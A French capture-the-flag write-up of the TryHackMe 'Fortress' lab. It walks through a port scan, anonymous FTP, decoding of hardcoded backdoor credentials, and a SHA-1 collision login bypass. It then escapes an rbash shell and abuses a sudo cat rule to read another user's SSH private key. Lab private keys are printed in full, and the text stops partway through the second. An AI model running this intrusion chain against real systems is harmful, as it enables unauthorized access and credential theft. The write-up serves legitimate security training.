# Fortress # 

## Task 1 Introduction ## 

## Task 2 Prepare for battle ## 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c 'echo "10.10.113.128   fortress" >> /etc/hosts'
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c 'echo "10.10.113.128   temple.fortress" >> /etc/hosts'
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A fortress -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 13:08 CET
Nmap scan report for fortress (10.10.113.128)
Host is up (0.035s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
|_  256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
5581/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           305 Jul 25 20:06 marked.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.228.66
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5752/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, LANDesk-RC, LPDString, RTSPRequest, SIPOptions, X11Probe: 
|     Chapter 1: A Call for help
|     Username: Password:
|   Kerberos, LDAPBindReq, LDAPSearchReq, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie: 
|     Chapter 1: A Call for help
|_    Username:
7331/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5752-TCP:V=7.91%I=7%D=11/1%Time=617FD8ED%P=x86_64-pc-linux-gnu%r(NU
SF:LL,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20")
SF:%r(GenericLines,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUs
SF:ername:\x20Password:\x20")%r(GetRequest,32,"\n\tChapter\x201:\x20A\x20C
SF:all\x20for\x20help\n\nUsername:\x20Password:\x20")%r(HTTPOptions,32,"\n
SF:\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20Password:\x
SF:20")%r(RTSPRequest,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\
SF:nUsername:\x20Password:\x20")%r(RPCCheck,28,"\n\tChapter\x201:\x20A\x20
SF:Call\x20for\x20help\n\nUsername:\x20")%r(DNSVersionBindReqTCP,32,"\n\tC
SF:hapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20Password:\x20"
SF:)%r(DNSStatusRequestTCP,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20he
SF:lp\n\nUsername:\x20Password:\x20")%r(Help,32,"\n\tChapter\x201:\x20A\x2
SF:0Call\x20for\x20help\n\nUsername:\x20Password:\x20")%r(SSLSessionReq,28
SF:,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20")%r(Te
SF:rminalServerCookie,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\
SF:nUsername:\x20")%r(TLSSessionReq,28,"\n\tChapter\x201:\x20A\x20Call\x20
SF:for\x20help\n\nUsername:\x20")%r(Kerberos,28,"\n\tChapter\x201:\x20A\x2
SF:0Call\x20for\x20help\n\nUsername:\x20")%r(SMBProgNeg,28,"\n\tChapter\x2
SF:01:\x20A\x20Call\x20for\x20help\n\nUsername:\x20")%r(X11Probe,32,"\n\tC
SF:hapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20Password:\x20"
SF:)%r(FourOhFourRequest,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help
SF:\n\nUsername:\x20Password:\x20")%r(LPDString,32,"\n\tChapter\x201:\x20A
SF:\x20Call\x20for\x20help\n\nUsername:\x20Password:\x20")%r(LDAPSearchReq
SF:,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20")%r
SF:(LDAPBindReq,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsern
SF:ame:\x20")%r(SIPOptions,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20he
SF:lp\n\nUsername:\x20Password:\x20")%r(LANDesk-RC,32,"\n\tChapter\x201:\x
SF:20A\x20Call\x20for\x20help\n\nUsername:\x20Password:\x20")%r(TerminalSe
SF:rver,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20
SF:")%r(NCP,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:
SF:\x20");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=11/1%OT=22%CT=1%CU=35453%PV=Y%DS=2%DC=T%G=Y%TM=617FD99
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   34.43 ms 10.9.0.1
2   34.74 ms fortress (10.10.113.128)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 233.47 seconds

```

Nmap nous montre plusieurs services qui sont : 
Le service SSH sur le port 22.  
Le service FTP sur le port 5581.   
Un service inconnu sur le port 5752.   
Le service HTTP sur le port 7331.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp fortress 5581
Connected to fortress.
220 (vsFTPd 3.0.3)
Name (fortress:tim): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 25 20:06 .
drwxr-xr-x    2 ftp      ftp          4096 Jul 25 20:06 ..
-rw-r--r--    1 ftp      ftp          1255 Jul 25 20:06 .file
-rw-r--r--    1 ftp      ftp           305 Jul 25 20:06 marked.txt
226 Directory send OK.
ftp> get .file
local: .file remote: .file
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .file (1255 bytes).
226 Transfer complete.
1255 bytes received in 0.00 secs (9.4989 MB/s)
ftp> get marked.txt
local: marked.txt remote: marked.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for marked.txt (305 bytes).
226 Transfer complete.
305 bytes received in 0.00 secs (315.5207 kB/s)
ftp> exit
221 Goodbye.
```

On se connecte sur le service FTP en mode anonymous et ça fonctionne.  
On récupère deux fichier marked.txt et .file.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat marked.txt 
If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```

Le fichier marked.txt nous parle d'un backdoor et de retrouver la clef de la carte.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ file .file
.file: python 2.7 byte-compiled
```
```python
tim@kali:~/Bureau/tryhackme/write-up$ uncompyle2 .file 
# 2021.11.01 13:38:58 CET
#Embedded file name: ../backdoor/backdoor.py
import socket
import subprocess
from Crypto.Util.number import bytes_to_long
usern = 232340432076717036154994L
passw = 10555160959732308261529999676324629831532648692669445488L
port = 5752
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
s.listen(10)

def secret():
    with open('secret.txt', 'r') as f:
        reveal = f.read()
        return reveal


while True:
    try:
        conn, addr = s.accept()
        conn.send('\n\tChapter 1: A Call for help\n\n')
        conn.send('Username: ')
        username = conn.recv(1024).decode('utf-8').strip()
        username = bytes(username, 'utf-8')
        conn.send('Password: ')
        password = conn.recv(1024).decode('utf-8').strip()
        password = bytes(password, 'utf-8')
        if bytes_to_long(username) == usern and bytes_to_long(password) == passw:
            directory = bytes(secret(), 'utf-8')
            conn.send(directory)
            conn.close()
        else:
            conn.send('Errr... Authentication failed\n\n')
            conn.close()
    except:
        continue
+++ okay decompyling .file 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2021.11.01 13:38:58 CET
tim@kali:~/Bureau/tryhackmy
```

Le fichier .file est du bytecode python2.   
Avec uncompyle2 on le décompile.   

On voit que le mot de passe le nom d'utilisateur sont chiffrés.  

```python
tim@kali:~/Bureau/tryhackme/write-up$ cat decode.py 
#from Crypto.Util.number import long_to_bytes
from binascii import unhexlify, hexlify

usern = 232340432076717036154994
passw = 10555160959732308261529999676324629831532648692669445488

def long_to_bytes (val, endianness='big'):
    """
    Use :ref:`string formatting` and :func:`~binascii.unhexlify` to
    convert ``val``, a :func:`long`, to a byte :func:`str`.
    :param long val: The value to pack
    :param str endianness: The endianness of the result. ``'big'`` for
      big-endian, ``'little'`` for little-endian.
    If you want byte- and word-ordering to differ, you're on your own.
    Using :ref:`string formatting` lets us use Python's C innards.
    """
    # one (1) hex digit per four (4) bits
    width = val.bit_length()
    # unhexlify wants an even multiple of eight (8) bits, but we don't
    # want more digits than we need (hence the ternary-ish 'or')
    width += 8 - ((width % 8) or 8)
    # format width specifier: four (4) bits per hex digit
    fmt = '%%0%dx' % (width // 4)
    # prepend zero (0) to the width, to zero-pad the output
    s = unhexlify(fmt % val)
    if endianness == 'little':
        # see http://stackoverflow.com/a/931095/309233
        s = s[::-1]
    return s 


print(long_to_bytes(usern))
print(long_to_bytes(passw))
```

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python decode.py 
b'1337-h4x0r'
b'n3v3r_g0nn4_g1v3_y0u_up'
```

On décode les identifiants.  
Les identifiants sont : 1337-h4x0r:n3v3r_g0nn4_g1v3_y0u_up     

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc fortress 5752

	Chapter 1: A Call for help

Username: 1337-h4x0r
Password: n3v3r_g0nn4_g1v3_y0u_up
t3mple_0f_y0ur_51n5
```

On se connecte sur le port 5752.
On met les identifiant et on a une phrase en leet.  

![page](./Task1-01.png)  

Sur le port 7331 on tombe sur page par défaut.   
Le message du début nous parlais d'un clef (key).   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://fortress:7331/ -w /usr/share/dirb/wordlists/common.txt -t 100 x html,php,txt -q
/.htaccess            (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/assets               (Status: 301) [Size: 312] [--> http://fortress:7331/assets/]
/index.html           (Status: 200) [Size: 10918]                                 
/server-status        (Status: 403) [Size: 275]                                   
/.htpasswd            (Status: 403) [Size: 275]          
```   

On trouve un répertoire assets.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -a "" -u http://10.10.155.233:7331/ -w /usr/share/dirb/wordlists/common.txt -t 100 -x html,php,css -q
/.htpasswd.html       (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.hta.css             (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htaccess.css        (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.hta.html            (Status: 403) [Size: 280]
/.htaccess.html       (Status: 403) [Size: 280]
/.hta.php             (Status: 403) [Size: 280]
/assets               (Status: 301) [Size: 322] [--> http://10.10.155.233:7331/assets/]
/.htpasswd.php        (Status: 403) [Size: 280]                                        
/.htpasswd.css        (Status: 403) [Size: 280]                                        
/.htpasswd            (Status: 403) [Size: 280]                                        
/index.html           (Status: 200) [Size: 10918]                                      
/index.html           (Status: 200) [Size: 10918]                                      
/private.php          (Status: 200) [Size: 0]                                          
/server-status        (Status: 403) [Size: 280]                                        
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -a "" -u http://10.10.155.233:7331/assets -w /usr/share/dirb/wordlists/common.txt -t 100 -x html,php,css -q
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.hta.css             (Status: 403) [Size: 280]
/.htpasswd.html       (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htaccess.html       (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/.hta.html            (Status: 403) [Size: 280]
/.htpasswd.css        (Status: 403) [Size: 280]
/.hta.php             (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.htaccess.css        (Status: 403) [Size: 280]
/style.css            (Status: 200) [Size: 747]
``` 

On trouve un répertoire assets dans le répertoire assets on a un fichier style.css.     

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://fortress:7331/assets/style.css
/*Am I a hint??

	VGhpcyBpcyBqb3VybmV5IG9mIHRoZSBncmVhdCBtb25rcywgbWFraW5nIHRoaXMgZm9ydHJlc3MgYSBzYWNyZWQgd29ybGQsIGRlZmVuZGluZyB0aGUgdmVyeSBvd24gb2YgdGhlaXIga2luZHMsIGZyb20gd2hhdCBpdCBpcyB0byBiZSB1bmxlYXNoZWQuLi4gVGhlIG9ubHkgb25lIHdobyBjb3VsZCBzb2x2ZSB0aGVpciByaWRkbGUgd2lsbCBiZSBncmFudGVkIGEgS0VZIHRvIGVudGVyIHRoZSBmb3J0cmVzcyB3b3JsZC4gUmV0cmlldmUgdGhlIGtleSBieSBDT0xMSURJTkcgdGhvc2UgZ3VhcmRzIGFnYWluc3QgZWFjaCBvdGhlci4=
*/
body{
	margin: 0;
	height: 0;
	background-color: black;
}

#container{

	width: 100%;
	height: 100%;
	color: white;
	align-content: center;
}


#login{
	display: block;
	margin: auto;
	padding: auto;

}

input{
	margin: auto;
	margin: 10px;
}

iframe{

	margin: auto;
	margin-top: 10%;
	padding: auto;
	display: block;

```

Dans la page style on a un message en base64.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ echo -n VGhpcyBpcyBqb3VybmV5IG9mIHRoZSBncmVhdCBtb25rcywgbWFraW5nIHRoaXMgZm9ydHJlc3MgYSBzYWNyZWQgd29ybGQsIGRlZmVuZGluZyB0aGUgdmVyeSBvd24gb2YgdGhlaXIga2luZHMsIGZyb20gd2hhdCBpdCBpcyB0byBiZSB1bmxlYXNoZWQuLi4gVGhlIG9ubHkgb25lIHdobyBjb3VsZCBzb2x2ZSB0aGVpciByaWRkbGUgd2lsbCBiZSBncmFudGVkIGEgS0VZIHRvIGVudGVyIHRoZSBmb3J0cmVzcyB3b3JsZC4gUmV0cmlldmUgdGhlIGtleSBieSBDT0xMSURJTkcgdGhvc2UgZ3VhcmRzIGFnYWluc3QgZWFjaCBvdGhlci4=' | base64 -d
This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each other.
```

On décode le message qui nous dit de retrouver la clef par collision.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ echo 't3mple_0f_y0ur_51n5' > fuzz.txt
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -a "" -u http://fortress:7331/ -w ./fuzz.txt -t 100 -x html,php,css -q
/t3mple_0f_y0ur_51n5.html (Status: 200) [Size: 1477]
/t3mple_0f_y0ur_51n5.php (Status: 200) [Size: 629]  
```

On recherche des pages avec la phrase que l'on a trouvée précédament.  
On trouve 2 pages.   

![page](./Task1-02.png)
![page](./Task1-03.png)  

On tombe sur une page de connexion.  
Dans le code source de la page il ya du code php.   
D'arpès le code source il faut trouver une collision.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://sha-mbles.github.io/messageA -nv
2021-11-01 15:53:14 URL:https://sha-mbles.github.io/messageA [640/640] -> "messageA" [1]
tim@kali:~/Bureau/tryhackme/write-up$ wget https://sha-mbles.github.io/messageB -nv
2021-11-01 15:53:18 URL:https://sha-mbles.github.io/messageB [640/640] -> "messageB" [1]
```

On télécharge les collisions.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat collision.py 
#!/usr/bin/env python3
import requests
import urllib

with open('messageA', 'rb') as f:
    name=urllib.parse.quote_plus(f.read())

with open('messageB', 'rb') as f:
    password=urllib.parse.quote_plus(f.read())

resp = requests.get(f'http://fortress:7331/t3mple_0f_y0ur_51n5.php?user={name}&pass={password}',
                    headers = {'Host': 'fortress:7331'})
print(resp.text)
```

On va injecter les collisions dans le site. 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python collision.py 
<html>
<head>
	<title>Chapter 2</title>
	<link rel='stylesheet' href='assets/style.css' type='text/css'>
</head>
<body>
	<div id="container">
        <video width=100% height=100% autoplay>
            <source src="./assets/flag_hint.mp4" type=video/mp4>
        </video>


<pre>'The guards are in a fight with each other... Quickly retrieve the key and leave the temple: 'm0td_f0r_j4x0n.txt</pre><!-- Hmm are we there yet?? May be we just need to connect the dots -->

<!--    <center>
			<form id="login" method="GET">
				<input type="text" required name="user" placeholder="Username"/><br/>
				<input type="text" required name="pass" placeholder="Password" /><br/>
				<input type="submit"/>
			</form>
		</center>
-->

    </div>

</body>
</html>
```

On injecte la collision et on a un nom de fichier qui est : m0td_f0r_j4x0n.txt   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://fortress:7331/m0td_f0r_j4x0n.txt
"The Temple guards won't betray us, but I fear of their foolishness that will take them down someday. 
I am leaving my private key here for you j4x0n. Prepare the fort, before the enemy arrives"
												- h4rdy

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxxO1IrpzA3klEYGFfD+4wUr5Q85IEEAIpwC+zY547gPJ5xIJE76j
hR8J6sTOsFJNa+PMG/MvqUFcubThbQ7y7GAj5DP1E/TuaTi7T/oARq5z1Zj+ZYyq/HiHp1
Z0HC10dMUIRmNXI/mtfIYkW+6ORl/1silywBdJ4oLi2P6FkRZ2JBCGYbspmAyaDvzdOme6
Jf4JsNUvOQImZx1EgEK/lao6DywzOyIQcwtzWFGVuH/OBJ350qK4/6vIjK30eAmdPE6Fnl
gqoc+jqunahusHeBlB4xx5+JqMg+OwnJ5VrDNIiTNLgpJO8VgEGOV7Ncjncc5AfZwF6ADo
kn65fIbBjY7tm+eygKYM7GIfDZU+jYgCQz93WnQwLRF3H8l1M7WwO9HDjSBVyo0Vh8We+n
2zMu+gQLkD8t78TGulst3FpViHDncYDFud+FOUCuSPkUPgVGQkahNmi6gzay6luV2Oh4w8
gYKwknE/efkh4CW5zOXF0Fogvp2Qibnz1p6MfINbAAAFiJXzXNaV81zWAAAAB3NzaC1yc2
EAAAGBAMcTtSK6cwN5JRGBhXw/uMFK+UPOSBBACKcAvs2OeO4DyecSCRO+o4UfCerEzrBS
TWvjzBvzL6lBXLm04W0O8uxgI+Qz9RP07mk4u0/6AEauc9WY/mWMqvx4h6dWdBwtdHTFCE
ZjVyP5rXyGJFvujkZf9bIpcsAXSeKC4tj+hZEWdiQQhmG7KZgMmg783TpnuiX+CbDVLzkC
JmcdRIBCv5WqOg8sMzsiEHMLc1hRlbh/zgSd+dKiuP+ryIyt9HgJnTxOhZ5YKqHPo6rp2o
brB3gZQeMcefiajIPjsJyeVawzSIkzS4KSTvFYBBjlezXI53HOQH2cBegA6JJ+uXyGwY2O
7ZvnsoCmDOxiHw2VPo2IAkM/d1p0MC0Rdx/JdTO1sDvRw40gVcqNFYfFnvp9szLvoEC5A/
Le/ExrpbLdxaVYhw53GAxbnfhTlArkj5FD4FRkJGoTZouoM2supbldjoeMPIGCsJJxP3n5
IeAluczlxdBaIL6dkIm589aejHyDWwAAAAMBAAEAAAGBAJMt2sjmF4oF0oXywAFwCuO8zj
R3GYgKD1uIjYfjQTyWyHpxNwzF8JbGr8pF3pk0/9A4BfrT+/SiQi95rv+2AZsIKQDZ+OLc
PjbEnpcuOW4II9NS3SGuseseIQxyOj1qzaJW2RtQ7mfGe6CIe/ELmVwmLbueMRwbG6C/K3
9KDO2LMaTQIsm2WbXz+yIBiH1ZmqHkAr4dnmADWuj5Fl/M+V9pDquQ/f9F2+tyF8C/8HUK
6AE52i0D6Mn88rQvF4J3d9wfwL0QWbrYalyA7liygt8K7sBCALkv/olXYXLbT4ewySSdyL
Olr8LmJenRxEmuCJVD3rf2MKaTZOnFgqnxk7OKJOulldQpsqaCJrKDGYqerVcJZmGPaDQv
lpuHlWx3YMWZmsyeD8LGRprmuGdLjSVdUxHio6E5ez1WdwCp55pYucqsj+rKs9HD14DHhj
PcjDUa1BslqPt1lHZvW+coIVNHCWt4r0ywMkPI4ylHfDAAId6LNUelyI72boEE3Q97wQAA
AMBp8KaQnnrieHw6k8/3AxqmjxxNaPAirdv5o59YCKx8Z6b5oOTC3zqTl2o9nC95u9K0WN
+tPziB4b6M4i2vcTgkf04riTBlXOhs1Coq6g4UK7hA8muncm7gMjyTSekGRDJ117aA/YY4
ElzAdURyEezsx7yUjK3u11ydd2FRbPbE1iXw1wbSaI1jGfkRW/QTSVKEOfaLqo0xgIPLxf
OTT6n6O3ARkh5++759yOVRc2uWB1cJdqDUxunGKA/rWTehwnsAAADBAPsaN5DkfL4/LL1t
PDfENpS68GvImWMNPDh4/d1SkShizvQRGSzLm1V6K/KVprGZJR0ewgRRGMwgdd5XUnFxE7
eQtyBnu4gLaNWRtRer3Zvr9/KzVkewfbLteKqZyx1B1vB19M5jn4m5oT85T7789ORrx5B6
SXvnmQIx7ByT4W4ClgPyR0eRRn88OIw7QhFdeMH/BpZ7DQLSJZzhdtavOJnomIDjDH1wTf
FG881GZpev3A+Z3VNKj1iN9gVzLcDKuQAAAMEAyvW4u/krg/vMpMRwWsVeLxqzN3SsLOQd
HxEdwnZMZIitYBeUiebkbRCrBy7D0rsFtfF5uC8BKUv7b8WG9YFZhnRvjodVMyYMmORAro
gTdM9rBCdKNMf/z0q36oMpO0On8MkXTv7W1oJ10eoF0oICVU6mKRUAUHmSoxYXN3msvLvZ
u6zkw+OP8QJX2zwbah38yuRhh8xRf2AlXtx2IxklXV/b8+6QH74Z5o7ZVbTLhzsv0fhFLe
8aBV2g1DdSMuSzAAAADmo0eDBuQDB2ZXJmbGF3AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

On regardant le fichier on a une clef privée pour : h4rdy.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 id_rsa 
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa h4rdy@fortress
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

UA Infra: Extended Security Maintenance (ESM) is not enabled.

0 updates can be applied immediately.

39 additional security updates can be applied with UA Infra: ESM
Learn more about enabling UA Infra: ESM service for Ubuntu 16.04 at
https://ubuntu.com/16-04

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Jul 26 14:04:41 2021 from 192.168.150.128
h4rdy@fortress:~$ id
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

On se connecte sur compte hardy mais ça mais des commandes ne fonctionnes pas.    
On est sur un shell restreint qui est rbash.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa h4rdy@fortress -t "bash --noprofile"
h4rdy@fortress:~$ export PATH=/bin:/usr/bin
h4rdy@fortress:~$ sudo -l
Matching Defaults entries for h4rdy on fortress:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User h4rdy may run the following commands on fortress:
    (j4x0n) NOPASSWD: /bin/cat
```

On configure la variable path pour avoir quelque commande, le faite de mettre noprofile met rien dans la variable path.  
On remarque que la configuration sur permet d'utiliser la commande cat avec les droits j4x0n sans mot de passe.   

```bash
h4rdy@fortress:~$ sudo -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAos93HTD06dDQA+pA9T/TQEwGmd5VMsq/NwBm/BrJTpfpn8av0Wzm
r8SKav7d7rtx/GZWuvj2EtP6DljnqhbpMEi05iAIBCEUHw+blPBd4em6J1LB38mdPiDRgy
pCfhRWTKsP8AJQQtPT1Kcb2to9pTkMenFVU3l2Uq9u5VviQu+FB/ED+65LYnw/uoojBzZx
W80eLpyvY1KyALbDKHuGFbJ3ufRQfoUz2qmHn5aOgrnUTH4xrVQkVbsrnI3nQLIJDIS94J
zH0U1nca2XBwRzhBc0f0Hpr61GKDFjzdsNEtfHK7NuO7wWQMiCvODXEPTMBwpoMhTfYJxo
h5kbE5QhNQENT2iEs0aRrk0OX/mURj3GrsRpLYlGIX9bKpwPlW+d9MquLdYlHxsWBIuv3x
esyHTvDMuEWvb6WhaW4A8taEPx2qWuNbH9T/G8hSgKmws0ioT+FNY5P1+s+e6SYeImOsrW
wEvzLr1LCcLbdthoDcFy1oYx5NxmpyYal+YwdNyfAAAFiP2Xirb9l4q2AAAAB3NzaC1yc2
EAAAGBAKLPdx0w9OnQ0APqQPU/00BMBpneVTLKvzcAZvwayU6X6Z/Gr9Fs5q/Eimr+3e67
cfxmVrr49hLT+g5Y56oW6TBItOYgCAQhFB8Pm5TwXeHpuidSwd/JnT4g0YMqQn4UVkyrD/
ACUELT09SnG9raPaU5DHpxVVN5dlKvbuVb4kLvhQfxA/uuS2J8P7qKIwc2cVvNHi6cr2NS
sgC2wyh7hhWyd7n0UH6FM9qph5+WjoK51Ex+Ma1UJFW7K5yN50CyCQyEveCcx9FNZ3Gtlw
cEc4QXNH9B6a+tRigxY83bDRLXxyuzbju8FkDIgrzg1xD0zAcKaDIU32CcaIeZGxOUITUB
DU9ohLNGka5NDl/5lEY9xq7EaS2JRiF/WyqcD5VvnfTKri3WJR8bFgSLr98XrMh07wzLhF
r2+loWluAPLWhD8dqlrjWx/U/xvIUoCpsLNIqE/hTWOT9frPnukmHiJjrK1sBL8y69SwnC
23bYaA3BctaGMeTcZqcmGpfmMHTcnwAAAAMBAAEAAAGANz/wTBexBSe3b5yvLoraRZeHJf
AtOW9UNHYOfL8aUXF79pyWTZuHLV6lGmojJkC2DdEs3YZe+0S0Nuo0s6PSvm/t86orDjur
eF7zjTeEpIWMhouu/yKMGelJMBnHNsHwB1SFtA0U75iy6hdLfJlTEh6p/WM4cXtmi+i82V
i1D8H4gxlnIKGlM2a2ubbm7CutjFmvRGInoq0NevCKidJhTjuiJZijOEw7rJibTazp77Lg
OJUahpdnPTCnPBlrwKipnuQQ5/+RR7bmzyIiohadpaAv8RKcguH7wXaKGlGx+TrTVGn1Lo
WJdgnAvgEj5/K8UH29PC8wZBclIdwPe4aLAvTmAabVfIM7Gd4KyEM9Djcomo/dVB/qiFyX
PzHgt1StaVwy9hj+3kMUD7VmqQ2PnHQ/+5q7iOJOw9hFbwBYwRnzUoZynQzco50Kba7m5n
QKSRopfS5+gdZHDBy+v+jAmFjYA9QQkX+sJPaWbN69/do/IhWe6LfKC8gEyY/YRhkBAAAA
wANf0XmyYxevEjQczs5hpOdyAtv3NpoNxtFtiY3jsTOcfp/kyeRNk1MLFxv/Gf0Tn9GgiU
HpYfBOEdmv12UktShoqyFaAFj4VqDV/yHkvCg6pQz0A2XFRHlAlJRJ1Zy7Ikjt2TPu7j3U
9F1S7GH8KrVqHkiqhWmjxFHk3/R5u2HBG9V9eeP00WiHnRpZKJk2c/bHeUdOKUc9bVzC9A
